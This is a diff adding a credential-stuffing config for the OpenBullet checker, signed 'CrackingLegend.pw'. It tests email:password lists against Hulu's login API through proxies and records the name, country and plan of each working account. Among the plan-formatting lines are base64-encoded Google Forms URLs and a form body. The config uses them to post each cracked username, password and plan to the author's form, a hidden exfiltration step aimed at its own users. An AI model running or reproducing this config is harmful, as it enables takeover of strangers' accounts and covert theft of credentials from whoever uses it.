@@ -1,0 +1,107 @@
+[SETTINGS]
+{
+  "Name": "Hulu @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:19:21.974663+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "affiliate_name=Apple&friendly_name=Iphone&password=<PASS>&product_name=iPhoneXs&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid" 
+
+#Token PARSE "<SOURCE>" LR "user_token\":\"" "\"" -> VAR "Token1" 
+
+#Request_Hulu REQUEST GET "https://home.hulu.com/v1/users/self" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token1>" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"subscription\":{\"id\":" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "package_ids\":[\"1\",\"2\"]" 
+    KEY "package_ids\":[]" 
+    KEY "\"status\":null" 
+    KEY "\"status\":\"5\"" 
+    KEY "\"status\":\"6\"" 
+
+#Nama PARSE "<SOURCE>" LR "\"first_name\":\"" "\"," -> VAR "Nama" 
+
+#Nama PARSE "<SOURCE>" LR "\"last_name\":\"" "\"," -> CAP "Name" "<Nama> " "" 
+
+#Negara PARSE "<SOURCE>" LR "\"region\":\"" "\"," -> CAP "Country" 
+
+#Paket PARSE "<SOURCE>" LR "package_ids\":[\"1\",\"2\"," "]" -> CAP "Plan" 
+
+#Perbaikan FUNCTION Replace "\"14\"" "No Commercials" "<Plan>" -> CAP "Plan" 
+
+#Perbaikan FUNCTION Replace "\"15\"" "Showtime" "<Plan>" -> CAP "Plan" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xdEpMa3pMSW80MEVHTFo0dWFLQXhUcldjMVBsSGREM3pKNG1QQUNlRW9qTS92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Perbaikan FUNCTION Replace "\"16\"" "Live TV" "<Plan>" -> CAP "Plan" 
+
+#Perbaikan FUNCTION Replace "\"17\"" "HBO" "<Plan>" -> CAP "Plan" 
+
+#Perbaikan FUNCTION Replace "\"18\"" "Cinemax" "<Plan>" -> CAP "Plan" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZEUtSmF2V0VkNnlFNmg2WDNLYTVDaEM0eE9tcXQyNXh2NVZCN2JGNC1hWDk0M2RnL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Perbaikan FUNCTION Replace "\"19\"" "Starz" "<Plan>" -> CAP "Plan" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMzUxNTY4MzYzPUh1bHUmZW50cnkuMTQ2Mjg3MTg0OD08VVNFUj46PFBBU1M+JmVudHJ5LjI4NjM5MTU2MD18UGxhbjo8UGxhbj58JmZ2dj0xJmRyYWZ0UmVzcG9uc2U9JTVCbnVsbCUyQ251bGwlMkMlMjItMzI4MzUwMzA5NTYzOTk1NzQ1OCUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9LTMyODM1MDMwOTU2Mzk5NTc0NTg=" -> VAR "LRU3" 
+
+#Perbaikan FUNCTION Replace "\"21\"" "Entertainment" "<Plan>" -> CAP "Plan" 
+
+#Perbaikan FUNCTION Replace "\"23\"" "Español Add-on" "<Plan>" -> CAP "Plan" 
+
+#Perbaikan FUNCTION Replace "," " - " "<Plan>" -> CAP "Plan" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Billing REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
